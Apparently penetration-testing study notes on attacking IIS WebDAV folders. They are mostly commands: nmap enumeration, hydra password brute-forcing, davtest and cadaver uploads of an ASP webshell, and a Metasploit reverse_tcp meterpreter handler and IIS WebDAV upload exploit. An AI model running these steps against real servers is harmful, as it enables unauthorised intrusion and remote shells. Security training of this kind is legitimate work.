
What WebDAV looks like from scan
```bash
nmap -p80 --script http-enum -sV #IP
```

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
|_  /webdav/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

# 401 Unauthorized - authentication is enabled
```

Can brute force with hydra
```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt $IP http-get /webdav/
```

## davtest

>Tool that sends exploit files to the WebDAV server and automatically creates the directory then uploads different format types of files and tries to execute uploaded files and gives an output of successfully executed files.

```bash
davtest -url http://$IP/webdav
```

If credentials are needed:
```bash
davtest -auth bob:password_123321 -url http://$IP/webdav
```

Will provide a summary of files that were uploaded:
```bash
/usr/bin/davtest Summary:
Created: http://$IP/webdav/DavTestDir_a7XjUR
PUT File: http://$IP/webdav/DavTestDir_a7XjUR/davtest_a7XjUR.txt
PUT File: http://$IP/webdav/DavTestDir_a7XjUR/davtest_a7XjUR.cfm
PUT File: http://$IP/webdav/DavTestDir_a7XjUR/davtest_a7XjUR.cgi
PUT File: http://$IP/webdav/DavTestDir_a7XjUR/davtest_a7XjUR.aspx
PUT File: http://$IP/webdav/DavTestDir_a7XjUR/davtest_a7XjUR.asp
PUT File: http://$IP/webdav/DavTestDir_a7XjUR/davtest_a7XjUR.html
PUT File: http://$IP/webdav/DavTestDir_a7XjUR/davtest_a7XjUR.php
PUT File: http://$IP/webdav/DavTestDir_a7XjUR/davtest_a7XjUR.jsp
PUT File: http://$IP/webdav/DavTestDir_a7XjUR/davtest_a7XjUR.jhtml
PUT File: http://$IP/webdav/DavTestDir_a7XjUR/davtest_a7XjUR.shtml
PUT File: http://$IP/webdav/DavTestDir_a7XjUR/davtest_a7XjUR.pl
Executes: http://$IP/webdav/DavTestDir_a7XjUR/davtest_a7XjUR.txt
Executes: http://$IP/webdav/DavTestDir_a7XjUR/davtest_a7XjUR.asp
Executes: http://$IP/webdav/DavTestDir_a7XjUR/davtest_a7XjUR.html
```

Then will provide screenshot of what files were successfully uploaded as well as which files were successfully executed.

## cadaver
```bash
cadaver http://$IP/webdav
```


Ex. script to use
```bash
/usr/share/webshells/asp/webshell.asp
```

Upload files via `put` and once uploaded they can be executed from browser ex. `http://$IP/webdav/webshell.asp`

## Metasploit

Can do the same with msvenom payload then use metasploit via:
```bash
use exploit/multi/handler 
set payload windows/meterpreter/reverse_tcp
set LHOST $IP
set LPORT 4444
run
```

Another option to use metasploit for the entire process. 
```bash
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS $IP
set HttpUsername $USER
set HttpPassword $PASSWORD
set PATH /webdav/metasploit.asp
exploit
```

